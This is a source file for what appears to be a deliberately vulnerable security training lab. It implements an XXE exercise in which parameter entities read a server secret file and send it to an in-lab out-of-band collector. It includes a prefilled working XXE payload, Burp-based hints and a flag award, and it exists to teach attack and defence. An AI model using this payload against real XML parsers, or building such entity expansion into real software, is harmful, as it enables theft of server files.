'use strict';
// Parameter-Entity OOB Exfiltration: the advanced import channel expands
// parameter entities inline inside the doctype, so %oob; can smuggle a
// brand-new <!ENTITY> declaration into the document at parse time and fire
// a pingback to the OOB collector.
const express = require('express');
const { page, esc, brief, flagBox, fixPanel, hintLadder, appShell } = require('../../../lib/page');
const { award } = require('../../../lib/flags');
const { expandParamEntities, oobLog, SECRET_ABS } = require('../shared');

const router = express.Router();

const vuln = {
  id: 'xxe-param-oob',
  name: 'Parameter-Entity OOB Exfiltration',
  difficulty: 'Hard',
  hint: 'Chain parameter entities entirely inline: %file; reads the secret, %oob; declares a new entity whose URL carries %file; to the in-lab collector. Mind the quoting.',
  hints: ["Proxy your browser through Burp and open the import console at /xxe/param. Submit the form once, find POST /xxe/param in Proxy HTTP history, and send it to Repeater so you can replay it while you iterate.", "Parameter entities (%) expand inline inside the DOCTYPE, and the in-lab collector at /xxe/collector/log means you need no external listener. In Repeater, declare one parameter entity that reads the secret file, then a second one whose value is a brand-new <!ENTITY> declaration with a SYSTEM URL pointing at the collector and carrying the file content as a query parameter.", "Reference the second parameter entity to smuggle the new declaration into the document, then reference the new general entity in your <data> body to fire the pingback. Key insight: the parser, not your browser, performs the callback fetch, so the secret leaves server-side; open the collector log afterwards to watch it land. Mind the quoting: the outer parameter entity value is double-quoted, so the inner declaration's URL must use single quotes."],
  tools: "BZ, B, C",
  how: 'In Burp Repeater, send XML whose DOCTYPE declares a parameter entity that reads the secret and a second one that smuggles in a new <!ENTITY> whose SYSTEM URL points at the in-lab collector carrying the file content, then reference the new entity in the body to fire the pingback.',
  link: '/xxe#xxe-param-oob',
  start: 'Proxy your browser through Burp and open the advanced import console at /xxe/param. Submit the form once, find the POST /xxe/param request in Proxy HTTP history, send it to Repeater, then replace the xml form field with your parameter-entity payload and send; check the OOB collector log after each attempt.',
};

const chrome = (crumb) => ({
  nav: ['Import', 'Mappings', 'History'],
  crumb,
  mark: '⇄',
});

// ---- v7: parameter-entity OOB ----
router.get('/param', (req, res) => {
  const base = `http://${req.get('host')}`;
  const sample = `<!DOCTYPE r [\n<!ENTITY % file SYSTEM "file://${SECRET_ABS}">\n<!ENTITY % oob "<!ENTITY exfil SYSTEM '${base}/xxe/collector/log?d=%file;'>">\n%oob;\n]>\n<data>&exfil;</data>`;
  res.send(page('Parameter Entity OOB', appShell('DataPipe Import Console', `
    <h1>Advanced XML import</h1>
    ${brief('Inline parameter entities', `
      <p>This import channel expands <b>parameter entities</b> (<code>%name;</code>) declared
      inside the DOCTYPE before it parses the document. External ones are resolved from
      <code>file://</code> paths on the import server or fetched from <code>http://</code> URLs.</p>
      <p>Because expansion happens <b>inline</b>, a parameter entity can smuggle a brand-new
      <code>&lt;!ENTITY&gt;</code> declaration into the document at parse time. Reference the new
      entity and the server fires the request. The <a href="/xxe/collector">OOB collector</a>
      shows every request the server makes while importing, so you can watch data leave.</p>
      <p><b>Quoting trick:</b> the outer parameter entity value is double-quoted, so the smuggled
      inner declaration must use <b>single quotes</b> around its URL.</p>`)}
    <form class="clay-card" method="POST" action="/xxe/param">
      <div class="card-top"><b>Paste XML to import</b></div>
      <div class="clay-field">
        <label for="xml">XML document</label>
        <textarea id="xml" name="xml" rows="10" cols="80">${esc(sample)}</textarea>
      </div>
      <button class="clay-btn clay-btn-primary" type="submit">Import XML</button>
    </form>
    ${hintLadder(vuln)}
    <p><a class="clay-btn clay-btn-secondary clay-btn-sm" href="/xxe">Back to XXE module</a></p>
  `, chrome('Advanced XML import'))));
});

router.post('/param', async (req, res) => {
  const xml = String(req.body.xml || '').slice(0, 20000);
  const before = oobLog.length;
  const expanded = await expandParamEntities(xml);
  const hits = oobLog.slice(before).filter((e) => e.d.includes('XXE-SECRET-4471'));
  let flags = '';
  // VULN: award only when this request made the server exfiltrate the secret to the collector.
  if (hits.length > 0) {
    flags += flagBox(award(req, 'xxe', 'xxe-param-oob'));
    flags += fixPanel('xxe', 'xxe-param-oob');
  }
  const dataMatch = expanded.match(/<data[^>]*>([\s\S]*?)<\/data>/i);
  const shown = dataMatch ? dataMatch[1] : expanded;
  res.send(page('Parameter Entity OOB', appShell('DataPipe Import Console', `
    <h1>Import result</h1>
    ${flags}
    <div class="card"><div class="card-top"><b>Out-of-band activity</b></div>
      <p>Pingbacks to the collector from this request carrying the secret: <b>${hits.length}</b>.
      (<a href="/xxe/collector">view the collector log</a>)</p>
    </div>
    <h2>Parsed content</h2>
    <pre>${esc(shown.slice(0, 2000))}</pre>
    <p><a class="clay-btn clay-btn-secondary clay-btn-sm" href="/xxe/param">&larr; Import more XML</a>
    <a class="clay-btn clay-btn-secondary clay-btn-sm" href="/xxe">Back to XXE module</a></p>
  `, chrome('Import result'))));
});

module.exports = { vuln, router };
